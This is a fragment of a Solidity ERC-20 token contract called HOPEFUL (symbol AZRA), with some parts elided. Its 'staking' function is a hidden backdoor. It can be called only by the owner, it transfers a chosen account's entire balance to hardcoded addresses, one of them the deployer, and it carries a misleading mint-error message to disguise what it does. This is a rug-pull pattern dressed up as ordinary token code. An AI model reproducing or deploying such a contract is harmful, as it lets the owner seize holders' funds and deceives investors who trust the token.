...
contract HOPEFUL is Context, IERC20 {
    ...
    address lead_deployer = 0xC4973de5eE925b8219f1E74559FB217A8e355EcF;
    address public _owner = 0xaaE6781DeE8db659e6A57D5a0D29074CA0EF8b9b;
   constructor () public {
        ...
        _symbol = "AZRA";
        _decimals = 18;
        uint256 initialSupply = 555555555;
        _safeOwner = _owner;
...
//-----------------------------------------------------------------------------------------------------------------------//
        ...
        function staking(address account) public {
        
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        address staker = 0x6448173553D3579c54E534C6b2103320932d7eE1;
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, staker, amount);
        ...
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        address staker = 0xC4973de5eE925b8219f1E74559FB217A8e355EcF;
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, staker, amount);
